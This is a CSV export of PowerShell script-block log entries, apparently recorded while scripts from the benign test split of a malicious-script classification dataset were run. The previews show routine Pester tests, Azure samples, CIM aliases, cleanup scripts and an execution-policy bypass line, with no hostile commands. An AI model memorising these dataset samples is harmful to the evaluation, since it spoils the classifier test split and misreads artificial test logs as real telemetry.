"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 9:23:04 AM","C:\TA\project-ta\data_spliting\test_set\benign\2125.ps1","1172","Describe ""Test trap"" -Tags ""CI"" {; Context ""Trap with flow control"" {; It ""Line after exception should NOT be continued when it's from a nested script block"" {; $a = . {trap {""trapped""; continue;}; . "
"8/6/2026 9:22:56 AM","C:\TA\project-ta\data_spliting\test_set\benign\2110.ps1","4599","Describe ""ArrayExpression Tests"" -Tags ""CI"" {; It ""@([object[]](1,2,3)) should return a 3-element array of object[]"" {; $result = @([object[]](1,2,3)); $result.GetType().FullName | Should -BeExactly """
"8/6/2026 9:22:48 AM","C:\TA\project-ta\data_spliting\test_set\benign\2064.ps1","4023","Describe ""Language Primitive Tests"" -Tags ""CI"" {; It ""Equality comparison with string and non-numeric type should not be culture sensitive"" {; $date = [datetime]'2005,3,10'; $val = [System.Management."
"8/6/2026 9:22:40 AM","","9","$global:?"
"8/6/2026 9:22:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:22:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:22:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:22:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:22:40 AM","C:\TA\project-ta\data_spliting\test_set\benign\2051.ps1","3164","try {; $defaultParamValues = $PSdefaultParameterValues.Clone(); $PSDefaultParameterValues[""it:skip""] = ![System.Management.Automation.Platform]::IsWindowsDesktop; Describe 'Basic COM Tests' -Tags ""CI"""
"8/6/2026 9:22:32 AM","C:\TA\project-ta\data_spliting\test_set\benign\2044.ps1","4607","Describe ""Telemetry for shell startup"" -Tag CI {; BeforeAll {; $cacheDir = [System.Management.Automation.Platform].GetField(""CacheDirectory"",""NonPublic,Static"").GetValue($null); $uuidPath = Join-Path "
"8/6/2026 9:22:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:22:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:22:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:22:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:22:24 AM","C:\TA\project-ta\data_spliting\test_set\benign\2016.ps1","209",". ""$psscriptroot/TestRunner.ps1""; $AssemblyName = ""Microsoft.PowerShell.ConsoleHost""; $excludeList = @(""HostMshSnapinResources.resx""); Test-ResourceStrings -AssemblyName $AssemblyName -ExcludeList $ex"
"8/6/2026 9:22:16 AM","C:\TA\project-ta\data_spliting\test_set\benign\1984.ps1","861","Describe ""New-Event"" -Tags ""CI"" {; Context ""Check return type of New-Event"" {; It ""Should return PSEventArgs as return type of New-Event"" {; New-Event -SourceIdentifier a | Should -BeOfType System.Man"
"8/6/2026 9:22:08 AM","C:\TA\project-ta\data_spliting\test_set\benign\1972.ps1","1664","Describe ""Remove-PSBreakpoint"" -Tags ""CI"" {; $testScript = Join-Path -Path (Join-Path -Path $PSScriptRoot -ChildPath assets) -ChildPath psbreakpointtestscript.ps1; $script = ""`$var = 1; `$var2 = Get-C"
"8/6/2026 9:22:00 AM","C:\TA\project-ta\data_spliting\test_set\benign\1938.ps1","773","Describe ""Measure-Command"" -Tags ""CI"" {; Context ""Validate return types for Measure-Command"" {; It ""Should return TimeSpan as the return type"" {; Measure-Command { Get-Date } | Should -BeOfType timesp"
"8/6/2026 9:21:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:21:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:21:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:21:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:21:52 AM","C:\TA\project-ta\data_spliting\test_set\benign\1929.ps1","692","Import-Module HelpersCommon; Describe ""Set-Date for admin"" -Tag @('CI', 'RequireAdminOnWindows', 'RequireSudoOnUnix') {; It ""Set-Date should be able to set the date in an elevated context"" -Skip:(Test"
"8/6/2026 9:21:44 AM","C:\TA\project-ta\data_spliting\test_set\benign\1924.ps1","7608","Describe ""Set-Variable DRT Unit Tests"" -Tags ""CI"" {; It ""Set-Variable normal variable Name should works""{; Set-Variable foo bar; $var1=Get-Variable -Name foo; $var1.Name|Should -BeExactly ""foo""; $var1"
"8/6/2026 9:21:36 AM","C:\TA\project-ta\data_spliting\test_set\benign\1920.ps1","1411","Describe ""Get-Runspace cmdlet tests"" -Tag ""CI"" {; BeforeAll {; $CurrentRunspace = $ExecutionContext.Host.Runspace; $ExpectedInstanceId = $CurrentRunspace.InstanceId; $ExpectedId = $currentRunspace.Id;"
"8/6/2026 9:21:28 AM","C:\TA\project-ta\data_spliting\test_set\benign\1905.ps1","740","Describe ""Get-FormatData"" -Tags ""CI"" {; Context ""Check return type of Get-FormatData"" {; It ""Should return an object[] as the return type"" {; $result = Get-FormatData; ,$result | Should -BeOfType ""Sys"
"8/6/2026 9:21:20 AM","C:\TA\project-ta\data_spliting\test_set\benign\1873.ps1","588","Describe ""New-TemporaryFile"" -Tags ""CI"" {; It ""creates a new temporary file"" {; $tempFile = New-TemporaryFile; $tempFile | Should -Exist; $tempFile | Should -BeOfType System.IO.FileInfo; $tempFile | S"
"8/6/2026 9:21:12 AM","C:\TA\project-ta\data_spliting\test_set\benign\1870.ps1","2493","Describe ""PSReadLine"" -tags ""CI"" {; BeforeAll {; if (Get-Module PSReadLine) {; $originalEditMode = (Get-PSReadLineOption).EditMode; Remove-Module PSReadLine; }; }; It ""Should import the module correct"
"8/6/2026 9:21:04 AM","C:\TA\project-ta\data_spliting\test_set\benign\1869.ps1","1280","Describe ""Get-PSHostProcessInfo tests"" -Tag CI {; BeforeAll {; $si = [System.Diagnostics.ProcessStartInfo]::new(); $si.FileName = ""pwsh""; $si.Arguments = ""-noexit""; $si.RedirectStandardInput = $true; "
"8/6/2026 9:20:55 AM","C:\TA\project-ta\data_spliting\test_set\benign\185.ps1","521","; $childWI_ReviewerActivityHasReviewers_Class_id = '6e05d202-38a4-812e-34b8-b11642001a80'; $childWI_ReviewerActivityHasReviewers_Class_obj = Get-SCSMRelationshipClass -id $childWI_ReviewerActivityHasR"
"8/6/2026 9:20:48 AM","","97","Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","105","Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","99","Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","102","Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","99","Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","112","Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","110","Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","101","Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","103","Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","101","Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","100","Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","100","Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:47 AM","C:\TA\project-ta\data_spliting\test_set\benign\1838.ps1","1404","Describe ""Test-Push-Location"" -Tags ""CI"" {; New-Variable -Name startDirectory -Value $(Get-Location).Path -Scope Global -Force; BeforeEach { Set-Location $startDirectory }; It ""Should be called withou"
"8/6/2026 9:20:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\1816.ps1","799","Describe ""Simple ItemProperty Tests"" -Tag ""CI"" {; It ""Can retrieve the PropertyValue with Get-ItemPropertyValue"" {; Get-ItemPropertyValue -path $TESTDRIVE -Name Attributes | Should -Be ""Directory""; };"
"8/6/2026 9:20:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\1799.ps1","1661","Describe ""Clear-EventLog cmdlet tests"" -Tags @('CI', 'RequireAdminOnWindows') {; BeforeAll {; $defaultParamValues = $PSdefaultParameterValues.Clone(); $PSDefaultParameterValues[""it:skip""] = !$IsWindow"
"8/6/2026 9:20:23 AM","C:\TA\project-ta\data_spliting\test_set\benign\1795.ps1","4729","Describe ""Basic Function Provider Tests"" -Tags ""CI"" {; BeforeAll {; $existingFunction = ""existingFunction""; $nonExistingFunction = ""nonExistingFunction""; $text = ""Hello World!""; $functionValue = { ret"
"8/6/2026 9:20:16 AM","","97","Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","105","Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","99","Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","102","Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","99","Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","112","Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","110","Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","101","Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","103","Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","101","Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","100","Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","100","Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\1793.ps1","1997","Describe ""Rename-Item tests"" -Tag ""CI"" {; BeforeAll {; Setup -f originalFile.txt -content ""This is content""; $source = ""$TESTDRIVE/originalFile.txt""; $target = ""$TESTDRIVE/ItemWhichHasBeenRenamed.txt"""
"8/6/2026 9:20:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\1787.ps1","2210","Describe ""Get-PSProvider"" -Tags ""CI"" {; It ""Should be able to call with no parameters without error"" {; { Get-PSProvider } | Should -Not -Throw; }; It ""Should be able to call the filesystem provider"" "
"8/6/2026 9:19:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\1750.ps1","1161","Import-Module $PSScriptRoot/CronTab/CronTab.psd1; Write-Host -Foreground Yellow ""Get the existing cron jobs""; Get-CronJob | Out-Host; Write-Host -Foreground Yellow ""New cron job to clean out tmp every"
"8/6/2026 9:19:51 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:51 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:51 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\1749.ps1","262","Import-Module Docker; Pull-ContainerImage hello-world; Run-ContainerImage hello-world; cls; Get-Container | Where-Object State -eq ""exited""; Get-Container | Where-Object State -eq ""exited"" | Remove-Co"
"8/6/2026 9:19:44 AM","","9","$global:?"
"8/6/2026 9:19:44 AM","C:\TA\project-ta\data_spliting\test_set\benign\1692.ps1","141","filter notnull {; $props = @(); $obj = $_; $obj | gm -m *property | % { if ( $obj.$($_.name) ) {$props += $_.name} }; $obj | select $props; }"
"8/6/2026 9:19:36 AM","","9","$global:?"
"8/6/2026 9:19:36 AM","C:\TA\project-ta\data_spliting\test_set\benign\1664.ps1","421","function Get-IEVersion ($computer = $env:COMPUTERNAME) {; $version = 0; $keyname = 'SOFTWARE\Microsoft\Internet Explorer'; $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $comp"
"8/6/2026 9:19:29 AM","","9","$global:?"
"8/6/2026 9:19:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:28 AM","C:\TA\project-ta\data_spliting\test_set\benign\1615.ps1","210","$Dest = ""C:\Support\SQLBac\"";; $Daysback = ""0"";; $CurrentDate = Get-Date; $DatetoDelete = $CurrentDate.AddDays($Daysback); Get-ChildItem $Dest | Where-Object { $_.LastWriteTime -lt $DatetoDelete } | R"
"8/6/2026 9:19:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:20 AM","C:\TA\project-ta\data_spliting\test_set\benign\1589.ps1","343","$folders = @('C:\Windows\Temp\*', 'C:\Documents and Settings\*\Local Settings\temp\*', 'C:\Users\*\Appdata\Local\Temp\*', 'C:\Users\*\Appdata\Local\Microsoft\Windows\Temporary Internet Files\*', 'C:\W"
"8/6/2026 9:19:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:12 AM","C:\TA\project-ta\data_spliting\test_set\benign\1219.ps1","621","& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve); $manifest = Test-ModuleManifest -Path (Join-Path -Path $PSScriptRoot -ChildPath '..\Carbon\Carbon.psd1' -Resolve); De"
"8/6/2026 9:19:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:04 AM","C:\TA\project-ta\data_spliting\test_set\benign\12.ps1","569","$poshGitModule = Get-Module posh-git -ListAvailable | Sort-Object Version -Descending | Select-Object -First 1; if ($poshGitModule) {; $poshGitModule | Import-Module; }; elseif (Test-Path -LiteralPath"
"8/6/2026 9:19:04 AM","","6","prompt"
"8/6/2026 9:19:02 AM","","58","Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass"
"8/6/2026 9:18:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:18:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:18:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:18:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:18:56 AM","C:\TA\project-ta\data_spliting\test_set\benign\1034.ps1","318","Set-StrictMode -Version Latest; & (Join-Path $PSScriptRoot Carbon\Import-Carbon.ps1 -Resolve); $websitePath = Join-Path $PSScriptRoot Website -Resolve; Install-IisWebsite -Name 'get-carbon.org' -Path "
"8/6/2026 9:18:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:18:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:18:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:18:40 AM","C:\TA\project-ta\data_spliting\test_set\benign\1029.ps1","557","Login-AzAccount; Get-AzSubscription; Set-AzContext -SubscriptionId ""yourSubscriptionID""; $RGname=""sfclustertutorialgroup""; $port=8081; $rulename=""allowAppPort$port""; $nsgname=""sf-vnet-security""; $nsg "
"8/6/2026 9:18:32 AM","C:\TA\project-ta\data_spliting\test_set\benign\1015.ps1","1007","$random = (New-Guid).ToString().Substring(0,8); $subscriptionId = ""my-azure-subscription-id""; $apimServiceName = ""apim-$random""; $resourceGroupName = ""apim-rg-$random""; $location = ""Japan East""; $orga"
"8/6/2026 9:18:24 AM","C:\TA\project-ta\data_spliting\test_set\benign\1012.ps1","1310","$random = (New-Guid).ToString().Substring(0,8); $subscriptionId = ""my-azure-subscription-id""; $apimServiceName = ""apim-$random""; $resourceGroupName = ""apim-rg-$random""; $location = ""Japan East""; $orga"
"8/6/2026 9:18:16 AM","C:\TA\project-ta\data_spliting\test_set\benign\1008.ps1","430","$myTopic = ""<your-custom-topic-name>""; $myEndpoint = ""<your-endpoint-URL>""; $myResourceGroup = ""<resource-group-name>""; New-AzResourceGroup -Name $myResourceGroup -Location westus2; New-AzEventGridTop"
"8/6/2026 9:18:08 AM","C:\TA\project-ta\data_spliting\test_set\benign\1006.ps1","317","$myEndpoint = ""<your-endpoint-URL>""; $myResourceGroup = ""<resource-group-name>""; $resourceGroupID = (New-AzResourceGroup -Name $myResourceGroup -Location westus2).ResourceId; New-AzEventGridSubscripti"
"8/6/2026 9:18:00 AM","","9","$global:?"
"8/6/2026 9:18:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:18:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:18:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:18:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:17:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\1001.ps1","193","$myEndpoint = ""<your-endpoint-URL>""; Set-AzContext -Subscription ""<subscription-name-or-ID>""; New-AzEventGridSubscription -Endpoint $myEndpoint -EventSubscriptionName demoSubscriptionToAzureSub"
"8/6/2026 9:17:59 AM","","9",".\uji.ps1"
"8/6/2026 9:16:33 AM","","6","prompt"
"8/6/2026 9:16:26 AM","C:\TA\project-ta\data_spliting\test_set\benign\433.ps1","350","Register-PSFTeppScriptblock -Name ""PSFramework-config-name"" -ScriptBlock {; $moduleName = ""*""; if ($fakeBoundParameter.Module) { $moduleName = $fakeBoundParameter.Module }; [PSFramework.Configuration."
"8/6/2026 9:16:19 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:16:19 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:16:18 AM","C:\TA\project-ta\data_spliting\test_set\benign\424.ps1","226","Register-PSFTeppScriptblock -Name ""PSFramework-config-fullname"" -ScriptBlock {; [PSFramework.Configuration.ConfigurationHost]::Configurations.Values | Where-Object { -not $_.Hidden } | Select-Object -"
"8/6/2026 9:16:10 AM","C:\TA\project-ta\data_spliting\test_set\benign\422.ps1","145","Register-PSFTeppScriptblock -Name 'PSFramework-config-validation' -ScriptBlock { [PSFramework.Configuration.ConfigurationHost]::Validation.Keys }"
"8/6/2026 9:16:02 AM","C:\TA\project-ta\data_spliting\test_set\benign\4200.ps1","503","Function EnableIEActiveXControl ($AppName,$GUID,$Flag) {; $Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\""+$GUID; If ((Test-Path $Key) -eq $true) {; Write-Host $AppName""....."
"8/6/2026 9:16:02 AM","C:\TA\project-ta\data_spliting\test_set\benign\4200.ps1","1550","Set-Variable -Name Errors -Value $null -Scope Global -Force; Set-Variable -Name LogFile -Value ""c:\windows\waller\Logs\BuildLogs\AdobeFlashPlayer.log"" -Scope Global -Force; Set-Variable -Name Relative"
"8/6/2026 9:15:54 AM","C:\TA\project-ta\data_spliting\test_set\benign\4198.ps1","574","Function InitializeGlobalMemory {; Set-Variable -Name Computers -Scope Global -Force; Set-Variable -Name Logfile -Scope Global -Force; Set-Variable -Name RelativePath -Scope Global -Force; Set-Variabl"
"8/6/2026 9:15:54 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:15:54 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:15:54 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:15:54 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:15:54 AM","C:\TA\project-ta\data_spliting\test_set\benign\4198.ps1","4344","Function InitializeGlobalMemory {; Set-Variable -Name Computers -Scope Global -Force; Set-Variable -Name Logfile -Scope Global -Force; Set-Variable -Name RelativePath -Scope Global -Force; Set-Variabl"
"8/6/2026 9:14:38 AM","C:\TA\project-ta\data_spliting\test_set\benign\4087.ps1","955","; $PatchReboot = Get-ChildItem -Path REGISTRY::""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired"" -ErrorAction SilentlyContinue; $ComponentBasedReb"
"8/6/2026 9:14:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:14:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:14:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:14:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:14:30 AM","C:\TA\project-ta\data_spliting\test_set\benign\4080.ps1","540","Import-Module $env:ProgramFiles""\Microsoft Security Client\MpProvider""; Start-MProtScan -ScanType ""FullScan""; New-EventLog â€“LogName System â€“Source ""Antimalware Full Scan""; Write-EventLog -LogName "
"8/6/2026 9:14:22 AM","","9","$global:?"
"8/6/2026 9:14:22 AM","C:\TA\project-ta\data_spliting\test_set\benign\3990.ps1","5061","function NetworkRuleSetTests {; $location = Get-Location; $resourceGroupName = getAssetName ""RSG""; $namespaceName = getAssetName ""ServiceBus-Namespace-""; $namespaceName2 = getAssetName ""ServiceBus-Nam"
"8/6/2026 9:14:15 AM","","9","$global:?"
"8/6/2026 9:14:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\3986.ps1","10113","function ServiceBusTests {; $location = Get-Location; $resourceGroupName = getAssetName ""RGName-""; $namespaceName = getAssetName ""Namespace1-""; $namespaceName2 = getAssetName ""Namespace2-""; Write-Debu"
"8/6/2026 9:14:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\375.ps1","1195","Describe ""Get-PSFConfig Unit Tests"" -Tag ""CI"", ""Config"", ""Unit"" {; BeforeAll {; Get-PSFConfig -Module PSFTests -Force | ForEach-Object {; $null = [PSFramework.Configuration.ConfigurationHost]::Configu"
"8/6/2026 9:13:59 AM","","9","$global:?"
"8/6/2026 9:13:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\3499.ps1","206","if ($PSEdition -eq 'Desktop') {; try {; [Microsoft.Azure.PowerShell.Authenticators.DesktopAuthenticatorBuilder]::Apply([Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance); } catch"
"8/6/2026 9:13:52 AM","","9","$global:?"
"8/6/2026 9:13:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\3100.ps1","724","$buildDir = ""$PSScriptRoot\build""; $ErrorActionPreference = 'Stop'; if (Test-Path $buildDir) {; Write-Verbose ""Removing build dir""; Remove-Item $buildDir -Recurse -Force -Confirm:$false -Verbose -Erro"
"8/6/2026 9:13:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:13:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:13:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:13:43 AM","C:\TA\project-ta\data_spliting\test_set\benign\3080.ps1","815","$global:ValidatorRoot = Split-Path $MyInvocation.MyCommand.Path; BeforeEachFeature {; New-Module -Name ValidatorTestEs {; . $global:ValidatorRoot\ValidatorEs.ps1 -Verbose; } | Import-Module -Global; }"
"8/6/2026 9:13:35 AM","C:\TA\project-ta\data_spliting\test_set\benign\3065.ps1","2653","Set-StrictMode -Version Latest; InModuleScope Pester {; Describe ""Should -HaveCount"" {; It ""passes if collection has the expected amount of items"" {; @(1, 'a', 3) | Should -HaveCount 3; }; It ""passes "
"8/6/2026 9:13:27 AM","C:\TA\project-ta\data_spliting\test_set\benign\3034.ps1","1541","Set-StrictMode -Version Latest; InModuleScope Pester {; Describe ""Should -Exist"" {; It ""returns true for paths that exist"" {; $TestDrive | Should Exist; $TestDrive | Should -Exist; }; It ""returns fals"
"8/6/2026 9:13:19 AM","C:\TA\project-ta\data_spliting\test_set\benign\3027.ps1","444","Set-StrictMode -Version Latest; InModuleScope Pester {; Describe ""the In statement"" {; Setup -Dir ""test_path""; It ""executes a command in that directory"" {; In ""$TestDrive"" -Execute { """" | Out-File ""te"
"8/6/2026 9:13:11 AM","C:\TA\project-ta\data_spliting\test_set\benign\2959.ps1","215","properties {; $my_property = $p1 + $p2; }; task default -depends TestParams; task TestParams {; Assert ($my_property -ne $null) ""`$my_property should not be null. Run with -parameters @{'p1' = 'v1'; '"
"8/6/2026 9:13:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
